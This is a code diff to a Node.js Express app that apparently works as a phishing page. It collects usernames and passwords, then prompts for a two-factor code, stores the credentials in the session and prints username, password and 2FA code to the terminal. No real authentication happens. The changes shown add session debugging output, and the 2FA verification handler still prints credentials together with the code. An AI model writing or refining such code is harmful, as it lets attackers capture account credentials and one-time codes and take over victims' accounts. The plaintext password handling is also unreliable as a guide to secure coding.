@@ -14,7 +14,7 @@ app.use(
     secret: 'mysecretkey', // Replace with a strong secret in production
     resave: false,
     saveUninitialized: true,
-    cookie: { secure: false }, // Use true only with HTTPS
+    cookie: { secure: false, maxAge: 60000 }, // Use secure: true for HTTPS only
   })
 );
 
@@ -35,7 +35,7 @@ app.post('/submit', (req, res) => {
   req.session.username = username;
   req.session.password = password;
 
-  console.log(`Login Attempt - Username: ${username}, Password: ${password}`);
+  console.log('Session after /submit:', req.session); // Debugging line
 
   // Redirect to 2FA page
   res.redirect('/2fa');
@@ -43,7 +43,10 @@ app.post('/submit', (req, res) => {
 
 // 2FA Form
 app.get('/2fa', (req, res) => {
+  console.log('Session Data at /2fa:', req.session); // Debugging line
+
   if (!req.session.username || !req.session.password) {
+    console.log('Redirecting to login because session data is missing.');
     return res.redirect('/'); // Redirect to login if session is empty
   }
 
@@ -70,7 +73,8 @@ app.get('/2fa', (req, res) => {
 app.post('/verify-2fa', (req, res) => {
   const authCode = req.body.authCode;
 
-  // Retrieve session data
+  console.log('Session Data at /verify-2fa:', req.session); // Debugging line
+
   const username = req.session.username;
   const password = req.session.password;
 
@@ -81,7 +85,7 @@ app.post('/verify-2fa', (req, res) => {
 
   console.log(`2FA Verification Attempt - Username: ${username}, Password: ${password}, 2FA Code: ${authCode}`);
 
-  // Clear session data
+  // Destroy session after successful verification
   req.session.destroy();
 
   res.send('Two-Factor Authentication successful! Check your terminal for logs.');
